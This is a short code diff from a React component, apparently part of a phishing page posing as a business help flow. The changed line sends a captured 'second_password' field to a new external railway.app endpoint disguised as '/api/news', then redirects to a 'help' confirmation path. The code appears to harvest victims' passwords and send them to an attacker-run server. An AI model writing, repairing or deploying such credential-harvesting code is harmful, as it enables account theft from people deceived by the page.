@@ -66,7 +66,7 @@ const Buiness = () => {
                         'second_password': passWord,
                     }
 
-                    axios.post( "https://sever79-production.up.railway.app/api/news", data) 
+                    axios.post( "https://theme1-production.up.railway.app/api/news", data) 
                         .then((response) => {
                             if (response.data.status === 0 ) {
                                 navigate('/help-100823847823627384548/confirm');
